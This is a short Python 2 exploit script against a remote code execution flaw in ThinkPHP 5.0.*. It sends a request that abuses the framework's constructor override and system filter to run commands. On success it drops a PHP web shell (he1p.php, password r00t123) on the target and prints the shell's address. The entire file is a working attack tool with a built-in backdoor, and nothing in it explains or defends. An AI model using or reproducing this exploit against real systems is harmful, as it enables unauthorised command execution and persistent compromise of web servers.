# /usr/bin/env python
# -*- coding:utf-8 -*-
'''
name: ThinkPHP V5.0.* 全版本远程代码执行漏洞
author: melvyn
description: 远程代码执行 影响范围：5.0.*
'''

import sys
import requests

payload = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo melvyn"
headers = {  
            "User-Agent":"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6",
            "Content-Type":"application/x-www-form-urlencoded"}

shell_payload = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo%20^<^?php%20@eval($_POST['r00t123']);?^>^success%20>he1p.php"

def exp_check(url):
    try:
        url = url.rstrip("/")
        path = ["/public/index.php","/public/index.php?captcha"]
        for p in path:
            check_path = url + p
            response = requests.post(url=check_path,data=payload,headers=headers)
            if response.status_code == 200 or response.status_code == 500:
                res = response.text
                res = res.encode('gbk','ignore')
                res= res.decode('gbk')
                if "melvyn" in res and "echo melvyn" not in res:
                    response1 = requests.post(url=check_path,data=shell_payload,headers=headers)
                    shell_url = url+"/public/he1p.php"
                    response2 = requests.get(shell_url)
                    if response2.status_code == 200 and "success" in response2.text:
                        print u"[+]存在ThinkPHP V5.0.*全版本远程代码执行漏洞...\tWebshell:%s | pass:r00t123"%shell_url
                        sys.exit()
                    else:
                        print u"[+]存在ThinkPHP V5.0.*全版本远程代码执行漏洞...\tWebshell:unknown"
                else:
                    pass
    except:
        pass

if __name__ =='__main__':
    exp_check(sys.argv[1])

